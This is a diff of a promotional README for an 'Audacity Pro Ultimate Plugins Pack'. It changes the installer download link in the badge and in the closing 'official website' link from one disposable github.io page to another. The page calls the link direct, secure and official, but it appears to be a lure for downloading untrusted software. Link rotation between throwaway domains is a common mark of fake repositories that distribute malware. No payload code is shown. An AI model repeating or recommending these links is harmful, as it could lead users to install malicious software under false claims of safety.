@@ -2,7 +2,7 @@
 
 The Audacity Pro Ultimate Plugins Pack is a must-have for audio enthusiasts looking to expand their toolkit with professional-grade enhancements. This audacity plugins pack offers a curated selection of effects and utilities for Audacity Pro, making it easier than ever to achieve studio-quality results from your home setup. Whether you're editing podcasts, music, or voiceovers, this pack streamlines workflows and unlocks creative potential without the need for multiple downloads.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -60,6 +60,6 @@ A: Check our GitHub repository or official website periodically for new versions
 
 For a direct and secure download, visit the official website using the link below. This ensures you receive the latest version with all features and security updates.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This link is identical to the badge at the top for your convenience. Always download from trusted sources to avoid unofficial copies that may pose security risks. Thank you for choosing the Audacity Pro Ultimate Plugins Pack to elevate your audio projects!
